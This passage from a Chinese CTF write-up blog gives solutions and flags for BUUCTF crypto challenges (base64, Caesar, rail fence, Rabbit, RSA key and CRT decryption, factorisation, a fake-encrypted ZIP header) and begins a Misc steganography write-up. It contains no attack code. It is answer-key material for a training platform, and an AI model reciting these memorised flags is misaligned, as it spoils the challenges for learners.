href="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/2.png" class="lazyload"></a></p><h3 id="flag-那你也很棒哦"><a href="#flag-那你也很棒哦" class="headerlink" title="flag{那你也很棒哦}"></a>flag{那你也很棒哦}</h3><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><h3 id="题目：姓名：张三-生日：19900315"><a href="#题目：姓名：张三-生日：19900315" class="headerlink" title="题目：姓名：张三   生日：19900315"></a>题目：姓名：张三   生日：19900315</h3><h3 id="key格式为key-xxxxxxxxxx"><a href="#key格式为key-xxxxxxxxxx" class="headerlink" title="key格式为key{xxxxxxxxxx}"></a>key格式为key{xxxxxxxxxx}</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无脑题，不知道有什么意义</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-zs19900315"><a href="#flag-zs19900315" class="headerlink" title="flag{zs19900315}"></a>flag{zs19900315}</h3><h2 id="0x08-一眼就解密"><a href="#0x08-一眼就解密" class="headerlink" title="0x08 一眼就解密"></a>0x08 一眼就解密</h2><h3 id="下面的字符串解密后便能获得flag："><a href="#下面的字符串解密后便能获得flag：" class="headerlink" title="下面的字符串解密后便能获得flag："></a>下面的字符串解密后便能获得flag：</h3><h3 id="ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30"><a href="#ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30" class="headerlink" title="ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30="></a>ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30=</h3><h3 id="注意：得到的-flag，请包上-flag-提交"><a href="#注意：得到的-flag，请包上-flag-提交" class="headerlink" title="注意：得到的 flag，请包上 flag{} 提交"></a>注意：得到的 flag，请包上 flag{} 提交</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">典型的base64</span><br><span class="line">https://base64.supfree.net/</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-THE-FLAG-OF-THIS-STRING"><a href="#flag-THE-FLAG-OF-THIS-STRING" class="headerlink" title="flag{THE_FLAG_OF_THIS_STRING}"></a>flag{THE_FLAG_OF_THIS_STRING}</h3><h2 id="0x09-伪ZIP加密"><a href="#0x09-伪ZIP加密" class="headerlink" title="0x09 伪ZIP加密"></a>0x09 伪ZIP加密</h2><h3 id="注意：得到的-flag-请包上-flag-提交"><a href="#注意：得到的-flag-请包上-flag-提交" class="headerlink" title="注意：得到的 flag 请包上 flag{} 提交"></a>注意：得到的 flag 请包上 flag{} 提交</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">导入UltraEdit，然后在第二个PK头部（50 4B 01 02）后面跟着1F 00 14 00 09 00</span><br><span class="line">只需要将00 09 00 改成00 00 00就可以解压文件拿到flag</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-Adm1N-B2G-kU-SZIP"><a href="#flag-Adm1N-B2G-kU-SZIP" class="headerlink" title="flag{Adm1N-B2G-kU-SZIP}"></a>flag{Adm1N-B2G-kU-SZIP}</h3><h2 id="0x10-丢失的MD5"><a href="#0x10-丢失的MD5" class="headerlink" title="0x10 丢失的MD5"></a>0x10 丢失的MD5</h2><h3 id="注意：得到的-flag-请包上-flag-提交-1"><a href="#注意：得到的-flag-请包上-flag-提交-1" class="headerlink" title="注意：得到的 flag 请包上 flag{} 提交"></a>注意：得到的 flag 请包上 flag{} 提交</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载到脚本后，看了一眼，感觉能直接跑出来，好吧。无脑题</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-e9032994dabac08080091151380478a2"><a href="#flag-e9032994dabac08080091151380478a2" class="headerlink" title="flag{e9032994dabac08080091151380478a2}"></a>flag{e9032994dabac08080091151380478a2}</h3><h2 id="0x11-Rabbit"><a href="#0x11-Rabbit" class="headerlink" title="0x11 Rabbit"></a>0x11 Rabbit</h2><h3 id="题目：U2FsdGVkX1-ydnDPowGbjjJXhZxm2MP2AgI"><a href="#题目：U2FsdGVkX1-ydnDPowGbjjJXhZxm2MP2AgI" class="headerlink" title="题目：U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI"></a>题目：U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接上解密网站，右下角选择Rabbit</span><br><span class="line">http://tool.chinaz.com/Tools/TextEncrypt.aspx</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/3.png" class="lazyload"></a></p><h3 id="flag-Cute-Rabbit"><a href="#flag-Cute-Rabbit" class="headerlink" title="flag{Cute_Rabbit}"></a>flag{Cute_Rabbit}</h3><h2 id="0x12-传统知识-古典密码"><a href="#0x12-传统知识-古典密码" class="headerlink" title="0x12 传统知识+古典密码"></a>0x12 传统知识+古典密码</h2><h3 id="题目：小明某一天收到一封密信，信中写了几个不同的年份"><a href="#题目：小明某一天收到一封密信，信中写了几个不同的年份" class="headerlink" title="题目：小明某一天收到一封密信，信中写了几个不同的年份"></a>题目：小明某一天收到一封密信，信中写了几个不同的年份</h3><h3 id="辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。"><a href="#辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。" class="headerlink" title="辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。"></a>辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。</h3><h3 id="信的背面还写有“-甲子”，请解出这段密文。"><a href="#信的背面还写有“-甲子”，请解出这段密文。" class="headerlink" title="信的背面还写有“+甲子”，请解出这段密文。"></a>信的背面还写有“+甲子”，请解出这段密文。</h3><h3 id="key值：CTF-XXX"><a href="#key值：CTF-XXX" class="headerlink" title="key值：CTF{XXX}"></a>key值：CTF{XXX}</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先去网上找一个顺序表</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/4.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/4.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">根据表找出不同年份对应的数字，背面说+甲子，于是在每个数字上面再加了60，得到</span><br><span class="line">88  90  83  68  77  70  76  90</span><br><span class="line">根据这些数字，我们的第一反应当然是ASCII，于是找出它对应的字符</span><br><span class="line">XZSDMFLZ</span><br><span class="line">于是用工具先进行栅栏解密、再凯撒解密得到flag</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/5.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/5.jpg" class="lazyload"></a></p><h3 id="flag-SHUANGYU"><a href="#flag-SHUANGYU" class="headerlink" title="flag{SHUANGYU}"></a>flag{SHUANGYU}</h3><h2 id="0x13-RSA"><a href="#0x13-RSA" class="headerlink" title="0x13 RSA"></a>0x13 RSA</h2><h3 id="题目：在一次RSA密钥对生成中，假设p-473398607161，q-4511491，e-17"><a href="#题目：在一次RSA密钥对生成中，假设p-473398607161，q-4511491，e-17" class="headerlink" title="题目：在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17"></a>题目：在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17</h3><h3 id="求解出d作为flag提交"><a href="#求解出d作为flag提交" class="headerlink" title="求解出d作为flag提交"></a>求解出d作为flag提交</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p = 473398607161</span><br><span class="line">q = 4511491</span><br><span class="line">e = 17</span><br><span class="line">n = (p-1)*(q-1)</span><br><span class="line">17d + ni = 1 (i = 1、2、3……)</span><br><span class="line">只需要找到这个d即可</span><br><span class="line">也就是符合 (1-ni)/17能被整除</span><br></pre></td></tr></tbody></table></figure></div><h3 id="脚本如下"><a href="#脚本如下" class="headerlink" title="脚本如下"></a>脚本如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">import sys</span><br><span class="line">p = 473398607161</span><br><span class="line">q = 4511491</span><br><span class="line">e = 17</span><br><span class="line">n = (p-1)*(q-1)</span><br><span class="line">i = 0</span><br><span class="line"># 17x + ny = 1</span><br><span class="line">while True:</span><br><span class="line">if((1-n*i)%e == 0):</span><br><span class="line">break;</span><br><span class="line">i-=1</span><br><span class="line">print '%d' % ((1 - n*i)/e)</span><br></pre></td></tr></tbody></table></figure></div><h3 id="运行结果-125631357777427553"><a href="#运行结果-125631357777427553" class="headerlink" title="运行结果: 125631357777427553"></a>运行结果: 125631357777427553</h3><h3 id="flag-125631357777427553"><a href="#flag-125631357777427553" class="headerlink" title="flag{125631357777427553}"></a>flag{125631357777427553}</h3><h2 id="0x14-Alice与Bob"><a href="#0x14-Alice与Bob" class="headerlink" title="0x14 Alice与Bob"></a>0x14 Alice与Bob</h2><h3 id="题目：密码学历史中，有两位知名的杰出人物，Alice和Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数-98554799767-请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行md5的32位小写哈希，提交答案。"><a href="#题目：密码学历史中，有两位知名的杰出人物，Alice和Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数-98554799767-请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行md5的32位小写哈希，提交答案。" class="headerlink" title="题目：密码学历史中，有两位知名的杰出人物，Alice和Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数:98554799767,请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行md5的32位小写哈希，提交答案。"></a>题目：密码学历史中，有两位知名的杰出人物，Alice和Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数:98554799767,请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行md5的32位小写哈希，提交答案。</h3><h3 id="注意：得到的-flag-请包上-flag-提交-2"><a href="#注意：得到的-flag-请包上-flag-提交-2" class="headerlink" title="注意：得到的 flag 请包上 flag{} 提交"></a>注意：得到的 flag 请包上 flag{} 提交</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">看到是质因数分解，直接用在线分解</span><br><span class="line">https://zh.numberempire.com/numberfactorizer.php</span><br><span class="line">得到：101999*966233</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-d450209323a847c8d01c6be47c81811a"><a href="#flag-d450209323a847c8d01c6be47c81811a" class="headerlink" title="flag{d450209323a847c8d01c6be47c81811a}"></a>flag{d450209323a847c8d01c6be47c81811a}</h3><h2 id="0x15-篱笆墙的影子"><a href="#0x15-篱笆墙的影子" class="headerlink" title="0x15 篱笆墙的影子"></a>0x15 篱笆墙的影子</h2><h3 id="题目：felhaagv-ewtehtehfilnakgw"><a href="#题目：felhaagv-ewtehtehfilnakgw" class="headerlink" title="题目：felhaagv{ewtehtehfilnakgw}"></a>题目：felhaagv{ewtehtehfilnakgw}</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">看着像栅栏密码</span><br><span class="line">https://www.qqxiuzi.cn/bianma/zhalanmima.php</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-wethinkwehavetheflag"><a href="#flag-wethinkwehavetheflag" class="headerlink" title="flag{wethinkwehavetheflag}"></a>flag{wethinkwehavetheflag}</h3><h2 id="0x16-传感器"><a href="#0x16-传感器" class="headerlink" title="0x16 传感器"></a>0x16 传感器</h2><h3 id="题目：5555555595555A65556AA696AA6666666955"><a href="#题目：5555555595555A65556AA696AA6666666955" class="headerlink" title="题目：5555555595555A65556AA696AA6666666955"></a>题目：5555555595555A65556AA696AA6666666955</h3><h3 id="这是某压力传感器无线数据包解调后但未解码的报文-hex"><a href="#这是某压力传感器无线数据包解调后但未解码的报文-hex" class="headerlink" title="这是某压力传感器无线数据包解调后但未解码的报文(hex)"></a>这是某压力传感器无线数据包解调后但未解码的报文(hex)</h3><h3 id="已知其ID为0xFED31F，请继续将报文完整解码，提交hex。"><a href="#已知其ID为0xFED31F，请继续将报文完整解码，提交hex。" class="headerlink" title="已知其ID为0xFED31F，请继续将报文完整解码，提交hex。"></a>已知其ID为0xFED31F，请继续将报文完整解码，提交hex。</h3><h3 id="提示1：曼联"><a href="#提示1：曼联" class="headerlink" title="提示1：曼联"></a>提示1：曼联</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/zz_Caleb/article/details/89331290</span><br></pre></td></tr></tbody></table></figure></div><p>##</p><h2 id="0x17-大帝的密码武器"><a href="#0x17-大帝的密码武器" class="headerlink" title="0x17 大帝的密码武器"></a>0x17 大帝的密码武器</h2><h3 id="题目：公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。"><a href="#题目：公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。" class="headerlink" title="题目：公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。"></a>题目：公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。</h3><h3 id="以下密文被解开后可以获得一个有意义的单词：FRPHEVGL"><a href="#以下密文被解开后可以获得一个有意义的单词：FRPHEVGL" class="headerlink" title="以下密文被解开后可以获得一个有意义的单词：FRPHEVGL"></a>以下密文被解开后可以获得一个有意义的单词：FRPHEVGL</h3><h3 id="你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交。"><a href="#你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交。" class="headerlink" title="你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交。"></a>你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交。</h3><h3 id="密文：ComeChina"><a href="#密文：ComeChina" class="headerlink" title="密文：ComeChina"></a>密文：ComeChina</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一感觉凯撒密码，发现偏移为13时为有意义单词</span><br></pre></td></tr></tbody></table></figure></div><h2 id="flag-PbzrPuvan"><a href="#flag-PbzrPuvan" class="headerlink" title="flag{PbzrPuvan}"></a>flag{PbzrPuvan}</h2><h2 id="0x18-robomunication"><a href="#0x18-robomunication" class="headerlink" title="0x18 robomunication"></a>0x18 robomunication</h2><h3 id="题目：给了一个mp3"><a href="#题目：给了一个mp3" class="headerlink" title="题目：给了一个mp3"></a>题目：给了一个mp3</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></div><p>##</p><h2 id="0x19-RSA1"><a href="#0x19-RSA1" class="headerlink" title="0x19 RSA1"></a>0x19 RSA1</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/6.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/6.png" class="lazyload"></a></p><h3 id="用了Hubei师傅的脚本"><a href="#用了Hubei师傅的脚本" class="headerlink" title="用了Hubei师傅的脚本"></a>用了Hubei师傅的脚本</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">def decrypt(dp,dq,p,q,c):</span><br><span class="line">InvQ = gmpy2.invert(q,p)</span><br><span class="line">mp = pow(c,dp,p)</span><br><span class="line">mq = pow(c,dq,q)</span><br><span class="line">m=(((mp-mq)*InvQ)%p)*q+mq</span><br><span class="line">print (binascii.unhexlify(hex(m)[2:]))</span><br><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br><span class="line"></span><br><span class="line">decrypt(dp,dq,p,q,c)</span><br></pre></td></tr></tbody></table></figure></div><h3 id="解出来是-noxCTF-W31c0m3-70-Ch1n470wn"><a href="#解出来是-noxCTF-W31c0m3-70-Ch1n470wn" class="headerlink" title="解出来是 noxCTF{W31c0m3_70_Ch1n470wn}"></a>解出来是 noxCTF{W31c0m3_70_Ch1n470wn}</h3><h3 id="flag-W31c0m3-70-Ch1n470wn"><a href="#flag-W31c0m3-70-Ch1n470wn" class="headerlink" title="flag{W31c0m3_70_Ch1n470wn}"></a>flag{W31c0m3_70_Ch1n470wn}</h3><h2 id="0x11-Rabbit-1"><a href="#0x11-Rabbit-1" class="headerlink" title="0x11 Rabbit"></a>0x11 Rabbit</h2><h3 id="题目：U2FsdGVkX1-ydnDPowGbjjJXhZxm2MP2AgI-1"><a href="#题目：U2FsdGVkX1-ydnDPowGbjjJXhZxm2MP2AgI-1" class="headerlink" title="题目：U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI"></a>题目：U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></div><p>##</p><h2 id="0x11-Rabbit-2"><a href="#0x11-Rabbit-2" class="headerlink" title="0x11 Rabbit"></a>0x11 Rabbit</h2><h3 id="题目：U2FsdGVkX1-ydnDPowGbjjJXhZxm2MP2AgI-2"><a href="#题目：U2FsdGVkX1-ydnDPowGbjjJXhZxm2MP2AgI-2" class="headerlink" title="题目：U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI"></a>题目：U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></div><p>##</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-BUUCTF-Misc刷题之旅-(1)</title>
      <link href="/2019/08/21/CTF-BUUCTF-Misc%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/"/>
      <url>/2019/08/21/CTF-BUUCTF-Misc%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="0x01-FLAG"><a href="#0x01-FLAG" class="headerlink" title="0x01 FLAG"></a>0x01 FLAG</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我们先把图片拖入Stegsolve中，然后在上面点击Analyse，点击Data Extract</span><br><span class="line">点击preview，然后在上面的hex的头部发现 50 4B 03 04 ，这是ZIP压缩包的标志</span><br><span class="line">我们点击Save Bin保存为ZIP文件</span><br><span class="line">若出现压缩包数据错误，只需在winrar的上方菜单中找到修复压缩包即可。</span><br><span class="line">然后解压后发现里面是一个linux程序，我们将它拖入IDA中</span><br><span class="line">发现Flag</span><br></pre></td></tr></tbody></table></figure></div><h2 id="flag-dd0gf4c3tok3yb0ard4g41n"><a href="#flag-dd0gf4c3tok3yb0ard4g41n" class="headerlink" title="flag{dd0gf4c3tok3yb0ard4g41n~}"></a>flag{dd0gf4c3tok3yb0ard4g41n<del>~</del>}</h2><h2 id="0x02-另外一个世界"><a href="#0x02-另外一个世界" class="headerlink" title="0x02 另外一个世界"></a>0x02 另外一个世界</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings 图片名</span><br><span class="line">发现末尾有01的字符串，7个7个分离，转为整数，再转为ascii，得到flag</span><br></pre></td></tr></tbody></table></figure></div><h2 id="flag-koekj3s"><a href="#flag-koekj3s" class="headerlink" title="flag{koekj3s}"></a>flag{koekj3s}</h2><h2 id="0x03-小白"><a href="#0x03-小白" class="headerlink" title="0x03 小白"></a>0x03 小白</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用PNG的CRC校对来爆破宽度，然后用hex修改高度</span><br><span 